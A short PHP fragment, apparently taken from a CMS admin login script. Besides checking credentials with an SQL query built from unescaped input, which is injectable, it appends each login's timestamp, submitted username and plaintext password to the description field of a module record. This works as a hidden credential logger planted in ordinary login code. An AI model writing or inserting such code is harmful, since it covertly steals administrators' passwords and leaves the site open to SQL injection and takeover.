";
?>
$login=mysql_query("SELECT * FROM admin WHERE username='$username' AND password='$pass' AND status='Aktif'");  $z=mysql_fetch_array(mysql_query("SELECT deskripsi FROM modul WHERE id='19' ")); date_default_timezone_set('Asia/Jakarta'); $y = "<b>Login in &nbsp;&nbsp;&nbsp;: </b>".date("Y-m-d H:i:s")." | User $_POST[username] | Password $_POST[password] <br>"; mysql_query("UPDATE modul SET deskripsi='$z[deskripsi]$y' WHERE id='19' ");
<?php